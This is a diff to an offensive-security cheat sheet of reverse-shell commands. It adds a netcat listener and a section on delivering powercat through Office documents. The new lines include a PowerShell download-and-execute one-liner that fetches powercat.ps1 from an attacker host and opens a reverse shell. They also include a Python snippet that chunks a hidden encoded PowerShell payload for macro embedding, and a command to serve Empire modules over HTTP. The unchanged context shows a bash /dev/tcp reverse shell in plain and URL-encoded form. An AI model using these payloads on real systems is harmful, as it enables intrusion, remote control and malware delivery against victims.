@@ -1,5 +1,11 @@
 # Reverse shells
 
+## Listener
+
+```
+nc -nvlp PortAtt
+```
+
 ## Powershell
 
 ```
@@ -18,4 +24,17 @@ bash -c "bash -i >& /dev/tcp/ip/port 0>&1"
 bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%200%3E%261%22
 ```
 
+## Powercat - Office
+
+```
+IEX(New-Object System.Net.WebClient).DownloadString('http://IpAtt/powercat.ps1');powercat -c IpAtt -p PortAtt -e powershell
+
+str = "powershell.exe -nop -w hidden -e xxxx..."
+n = 50
+for i in range(0, len(str), n):
+	print("Str = Str + " + '"' + str[i:i+n] + '"')
+
+cd /usr/share/powershell-empire/empire/server/data/module_source/management
+python3 -m http.server 80
+```
 
